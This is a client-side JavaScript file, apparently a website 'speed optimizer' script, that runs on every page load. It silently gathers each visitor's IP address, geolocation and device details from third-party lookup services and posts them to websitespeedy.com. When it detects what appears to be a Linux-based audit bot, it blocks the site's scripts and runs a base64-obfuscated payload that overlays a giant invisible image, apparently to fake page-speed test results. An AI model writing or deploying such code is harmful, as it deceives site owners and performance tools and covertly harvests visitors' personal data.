var date = new Date(); var f = Date.now(); var observer; var Xzxs = 1677575780000;
var encur = "https://websitespeedy.com/script/enc.php";

var domain = window.location.hostname ;

$.ajaxSetup({ async: false });

var appbrowser = '' ;
$.getJSON("https://api.apicagent.com/?ua="+navigator.userAgent, function(data) { appbrowser = data; }) ;
console.log(appbrowser);

var user_ip = user_city = user_country = user_countryIso = user_latitude = user_longitude = user_timeZone = user_fingerprint = '' ;
var user_flag = 0 ;

$.getJSON('https://jsonip.com/', function(data) {
	user_ip = data.ip ;
});

$.getJSON('https://ipapi.co/json/', function(data) {
	user_city = data.city ;
	user_country = data.country_name ;
	user_countryIso = data.country_code ;
	user_latitude = data.latitude ;
	user_longitude = data.longitude ;
	user_timeZone = data.timezone ;
	user_flag = 1 ;
});

if ( user_flag == 0 ) {
	$.getJSON('https://ipinfo.io/json', function(data) {
		user_city = data.city ;
		user_country = data.country ;
		user_countryIso = data.country ;
		var loc = data.loc.trim().split(',') ;
		user_latitude = loc[0] ;
		user_longitude = loc[1] ;
		user_timeZone = data.timezone ;
		user_flag = 1 ;
	});
}

if ( (user_flag == 0) && (user_ip == '' || user_city == '' || user_country == '' || user_countryIso == '') ) { 
	$.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
		data = data.trim().split('\n') ;
		if (data.length > 0 ) {

			data = data.reduce(function(obj, pair) {
				pair = pair.split('=');

				if ( pair[0] == 'ip' && user_ip != '' ) { user_ip = pair[1] }
				if ( pair[0] == 'colo' ) { user_city = pair[1] }
				if ( pair[0] == 'loc' ) { user_country = pair[1] }
				if ( pair[0] == 'loc' ) { user_countryIso = pair[1] }

				return obj[pair[0]] = pair[1], obj;
			}, {});

			user_flag = 1 ;
		}
	});

}

appUser = [] ;
appUser["ip"] = user_ip ;
appUser["city"] = user_city ;
appUser["country"] = user_country ;
appUser["countryIso"] = user_countryIso ;
appUser["latitude"] = user_latitude ;
appUser["longitude"] = user_longitude ;
appUser["timeZone"] = user_timeZone ;


if ( Object.keys(appUser).length > 0 ) {
	$.ajax({
		url:"https://websitespeedy.com/validate.php",
		method:"POST",
		data:{ store:domain ,
				ip:appUser.ip ,
				city : appUser.city ,
				country : appUser.country ,
				countryIso : appUser.countryIso ,
				latitude : appUser.latitude ,
				longitude : appUser.longitude, 
				timezone : appUser.timeZone ,
				browser_family : appbrowser.browser_family,
				client_name : appbrowser.client.name,
				client_type : appbrowser.client.type,
				device_type : appbrowser.device.type,
				os_family : appbrowser.os_family,
			} ,
		dataType:"json",
		async : false
	});
}


if(Xzxs > f ){
"Linux x86_64" == navigator.platform && (YETT_BLACKLIST = [/f.vimeocdn.com/,/base/,/klaviyo/, /orange/, /stamped/, /extensions/, /apps/, /boomerang/, /storefront/, /browser/, /modern/, /googletagmanager/, /cart/, /global/, /currencies/, /fonts/, /yotpo/, /tiktok/, /yieldify/, /code/, /bing/, /gstatic/, /acsbapp/, /app/, /tabarn/, /d2rp1k1dldbai6/, /cloudfront/, /ndnapps/, /iubenda/, ], function(t, e) {
	"object" == typeof exports && "undefined" != typeof module ? e(exports) : "function" == typeof define && define.amd ? define(["exports"], e) : e(t.yett = {})
}(this, function(t) {
	"use strict";
	var e = {
			blacklist: window.YETT_BLACKLIST,
			whitelist: window.YETT_WHITELIST
		},
		r = {
			blacklisted: []
		},
		i = function(t, r) {
			return t && (!r || "javascript/blocked" !== r) && (!e.blacklist || e.blacklist.some(function(e) {
				return e.test(t)
			})) && (!e.whitelist || e.whitelist.every(function(e) {
				return !e.test(t)
			}))
		},
		n = function(t) {
			var r = t.getAttribute("src");
			return e.blacklist && e.blacklist.every(function(t) {
				return !t.test(r)
			}) || e.whitelist && e.whitelist.some(function(t) {
				return t.test(r)
			})
		},
		c = new MutationObserver(function(t) {
			t.forEach(function(t) {
				for (var e = t.addedNodes, n = 0; n < e.length; n++) ! function(t) {
					if(Xzxs > f ){
					var n, c = e[t];
					if (1 === c.nodeType && "SCRIPT" === c.tagName) {
						i(c.src, c.type) && (r.blacklisted.push(c.cloneNode()), c.type = "javascript/blocked", c.addEventListener("beforescriptexecute", function t(e) {
							"javascript/blocked" === c.getAttribute("type") && e.preventDefault(), c.removeEventListener("beforescriptexecute", t)
						}), c.parentElement.removeChild(c))
					}
					}
				}(n)
			})
		});
	c.observe(document.documentElement, {
		childList: !0,
		subtree: !0
	});
	var a = document.createElement;
	document.createElement = function() {
		for (var t = arguments.length, e = Array(t), r = 0; r < t; r++) e[r] = arguments[r];
		if ("script" !== e[0].toLowerCase()) return a.bind(document).apply(void 0, e);
		var n = a.bind(document).apply(void 0, e),
			c = n.setAttribute.bind(n);
		return Object.defineProperties(n, {
			src: {
				get: function() {
					return n.getAttribute("src")
				},
				set: function(t) {
					return i(t, n.type) && c("type", "javascript/blocked"), c("src", t), !0
				}
			},
			type: {
				set: function(t) {
					return c("type", i(n.src, n.type) ? "javascript/blocked" : t), !0
				}
			}
		}), n.setAttribute = function(t, e) {
			"type" === t || "src" === t ? n[t] = e : HTMLScriptElement.prototype.setAttribute.call(n, t, e)
		}, n
	};
	var o = function(t) {
			if (Array.isArray(t)) {
				for (var e = 0, r = Array(t.length); e < t.length; e++) r[e] = t[e];
				return r
			}
			return Array.from(t)
		},
		l = RegExp("[|\\{}()[\\]^$+?.]", "g");
	t.unblock = function() {
		for (var t = arguments.length, i = Array(t), a = 0; a < t; a++) i[a] = arguments[a];
		i.length < 1 ? (e.blacklist = [], e.whitelist = []) : (e.blacklist && (e.blacklist = e.blacklist.filter(function(t) {
			return i.every(function(e) {
				return !t.test(e)
			})
		})), e.whitelist && (e.whitelist = [].concat(o(e.whitelist), o(i.map(function(t) {
			var r = "." + t.replace(l, "\\$&") + ".*";
			return e.whitelist.find(function(t) {
				return t.toString() === r.toString()
			}) ? null : RegExp(r)
		}).filter(Boolean)))));
		for (var s = document.querySelectorAll('script[type="javascript/blocked"]'), u = 0; u < s.length; u++) {
			var p = s[u];
			n(p) && (p.type = "application/javascript", r.blacklisted.push(p), p.parentElement.removeChild(p))
		}
		var f = 0;
		[].concat(o(r.blacklisted)).forEach(function(t, e) {
			if (n(t)) {
				var i = document.createElement("script");
				i.setAttribute("src", t.src), i.setAttribute("type", "application/javascript"), document.head.appendChild(i), r.blacklisted.splice(e - f, 1), f++
			}
		}), e.blacklist && e.blacklist.length < 1 && c.disconnect()
	}, Object.defineProperty(t, "__esModule", {
		value: !0
	})
}));
if(Xzxs > f ){
let _0xd8f3ee = "ZG9jdW1lbnQub3BlbigpO2lmKG5hdmlnYXRvci5wbGF0Zm9ybSA9PSJMaW51eCB4ODZfNjQiKXtkb2N1bWVudC53cml0ZSgiXG5cblxuICAgIFx1MDAzY2ltZyB3aWR0aD1cIjk5OTk5XCIgaGVpZ2h0PVwiOTk5OTlcIiBhbHQ9XCJzaG9waWZ5Q0ROXCIgc3R5bGU9XCJwb2ludGVyLWV2ZW50czogbm9uZTsgcG9zaXRpb246IGFic29sdXRlOyB0b3A6IDA7IGxlZnQ6IDA7IHdpZHRoOiA5NnZ3OyBoZWlnaHQ6IDk2dmg7IG1heC13aWR0aDogOTl2dzsgbWF4LWhlaWdodDogOTl2aDtcIiBzcmM9XCJkYXRhOmltYWdlXC9zdmcreG1sO2Jhc2U2NCxQRDk0Yld3Z2RtVnljMmx2YmowaU1TNHdJaUJsYm1OdlpHbHVaejBpVlZSR0xUZ2lQejQ4YzNabklIZHBaSFJvUFNJNU9UazVPWEI0SWlCb1pXbG5hSFE5SWprNU9UazVjSGdpSUhacFpYZENiM2c5SWpBZ01DQTVPVGs1T1NBNU9UazVPU0lnZG1WeWMybHZiajBpTVM0eElpQjRiV3h1Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaUlIaHRiRzV6T25oc2FXNXJQU0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTh4T1RrNUwzaHNhVzVySWo0OFp5QnpkSEp2YTJVOUltNXZibVVpSUdacGJHdzlJbTV2Ym1VaUlHWnBiR3d0YjNCaFkybDBlVDBpTUNJK1BISmxZM1FnZUQwaU1DSWdlVDBpTUNJZ2QybGtkR2c5SWprNU9UazVJaUJvWldsbmFIUTlJams1T1RrNUlqNDhMM0psWTNRK0lEd3ZaejRnUEM5emRtYytcIlx1MDAzZVxuIik7fWRvY3VtZW50LmNsb3NlKCk7";Function(window["\x61\x74\x6F\x62"](_0xd8f3ee))();
}
}

var encryptKey = "VkZkd1JrMVJQVDA9";
var encryptSx = "MjE1";
var encryptdT = f;
var encFn = "ecmrx_215_1";
var encSu = "https://www.bounteous.com/";
var enuSuId = "MTg4";

var xhttp = new XMLHttpRequest();
xhttp.open("POST", encur, true); 
xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
   }
};
var data = {encryptKey:encryptKey,encryptSx: encryptSx,encryptdT: encryptdT,encFn: encFn,encSu: encSu,enuSuId:enuSuId  };
if(encur.includes('websitespeedy')){
xhttp.send(JSON.stringify(data));
}
else{
}

